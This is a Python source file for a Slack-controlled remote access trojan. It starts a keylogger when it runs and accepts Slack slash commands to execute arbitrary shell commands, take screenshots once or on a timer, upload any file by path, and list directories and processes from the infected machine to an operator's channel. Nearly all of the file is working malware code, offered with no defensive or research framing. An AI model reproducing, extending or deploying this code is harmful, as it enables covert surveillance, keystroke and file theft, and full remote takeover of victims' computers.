import os, sys, json, subprocess
from slack_bolt import App
from slack_bolt.adapter.socket_mode import SocketModeHandler
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError
from slack_sdk.models import blocks
from config import Config
from screen_capture import ScreenCapture
from computer_info import ComputerInfo
from file_handler import FileHandler
from keylogger import Keylogger
import blocks
from apscheduler.schedulers.background import BackgroundScheduler

"""
This class is used to handle commands and events sent by the owner in the slack workspace.
Each active instance will receive messages in its own channel, and respond in its own channel.
    Commands:
    - /terminate - terminates the session
    - /echo - liveliness message
    - /change_channel <slack_channel_id> <compter_name> - changes input/output channel to value
    - /capture_screen - captures screen, saves localy and sends back in channel
    - /request_file <path> - bot sends file to channel 
"""


class slackBot:
    def __init__(self, config: Config) -> None:
        self.config = config
        self.screenshot = ScreenCapture(self.config)
        self.computer_info = ComputerInfo(self.config)
        self.file_handler = FileHandler(self.config)
        self.server_bot = App(
            token=self.config.botToken, signing_secret=self.config.channelSecret
        )
        self.msg_client = WebClient(token=self.config.botToken)
        self.scheduler = BackgroundScheduler()
        self.keylogger = Keylogger(config, self.file_handler,self.msg_client)
        self.keylogger.start()
        self.init_commands()

    def init_commands(self):
        self.server_bot.command("/echo")(self.echo_command)
        self.server_bot.command("/change_channel")(self.change_channel)
        self.server_bot.command("/capture_screen")(self.capture_screen)
        self.server_bot.command("/terminate")(self.terminate_session)
        self.server_bot.command("/request_file")(self.request_file_from_path)
        self.server_bot.command("/capture_every")(self.capture_every)
        self.server_bot.command("/end_capture_every")(self.end_capture_every)
        self.server_bot.command("/get_dirlist")(self.get_dirlist)
        self.server_bot.command("/get_process_list")(self.get_process_list)
        self.server_bot.command("/cmd")(self.exec_cmd)
        self.server_bot.command("/whos_alive")(self.echo_liveness)

    def start_listen(self):
        self.load_channel()
        SocketModeHandler(self.server_bot, self.config.appToken).start()

    def startingMessage(self):
        self.send_message(
            blocks.plain_text(
                f"Hi i'm new! My computer name is: {os.environ['COMPUTERNAME']}.\nPlease change my channel before executing commands!"
            )
        )

    def echo_liveness(self, ack, body):
        ack(
            f"I'm alive!\nComputer Name: {os.environ['COMPUTERNAME']}\nChannel ID: {self.config.channelId}"
        )

    def check_channel(self, channel_id):
        return self.config.channelId == channel_id

    def send_message(self, metadata):
        try:
            result = self.msg_client.chat_postMessage(
                token=self.config.botToken,
                channel=self.config.channelId,
                blocks=metadata,
                text="",
            )
        except SlackApiError as e:
            print(f"Error: {e}")

    def get_file(self, file_path):
        self.file_handler.upload_file(self.msg_client, file_path)

    def load_channel(self):
        try:
            with open(
                str(self.config.logPath + self.config.channelJson), "r"
            ) as listfile:
                self.config.channelId = json.load(listfile)
            self.send_message(blocks.plain_text("I'm alive again"))
        except Exception:
            self.startingMessage()

    def save_channel(self, new_channel_id):
        try:
            with open(
                str(self.config.logPath + self.config.channelJson), "w"
            ) as channelJson:
                json.dump(new_channel_id, channelJson)
        except Exception:
            self.send_message(blocks.plain_text(f"Error: Channel wasn't saved"))

    def change_channel(self, ack, body):
        channel, computer_name = body["text"].split()
        if computer_name == self.config.computerName:
            self.config.channelId = channel
            self.save_channel(channel)
            ack(f"My new channel is {self.config.channelId}")
        else:
            ack()

    def echo_command(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        channel_id = body["channel_id"]
        payload = body["text"]
        channel_name = body["channel_name"]
        ack(
            f"My channel is {channel_name}, with the id <@{channel_id}>\n The payload is: {payload}"
        )

    def exec_cmd(self, ack, body):
        command = body["text"]
        response = subprocess.Popen( f'{command}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = response.communicate()
        if error:
            ack(error.decode("utf-8"))
        else:
            ack(output.decode("utf-8"))
            
    def take_screenshot(self):
        image_path = self.screenshot.captureScreen()
        self.file_handler.upload_file(self.msg_client, image_path)

    def capture_screen(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        ack()
        self.take_screenshot()

    def capture_every(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        if body["text"]:
            self.config.screenshotFrequency = int(body["text"])
        ack(
            f"Beginning screen capture sequence every {self.config.screenshotFrequency} seconds."
        )
        self.scheduler.add_job(
            id="capture",
            func=self.take_screenshot,
            trigger="interval",
            seconds=self.config.screenshotFrequency,
        )
        self.scheduler.start()

    def end_capture_every(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        ack("Terminating screen capturing sequence")
        self.scheduler.remove_job("capture")

    def request_file_from_path(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        path = body["text"]
        ack("Trying to get the specified file...")
        self.get_file(path)

    def get_dirlist(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        ack("Trying to get dirlist...")
        dirlist_filepath = self.computer_info.get_dirlist()
        self.get_file(dirlist_filepath)

    def get_process_list(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        ack("Trying to get processes list...")
        process_list_filepath = self.computer_info.get_process_list()
        self.get_file(process_list_filepath)
           
    def terminate_session(self, ack, body):
        if not self.check_channel(body["channel_id"]):
            ack()
            return
        ack()
        sys.exit()
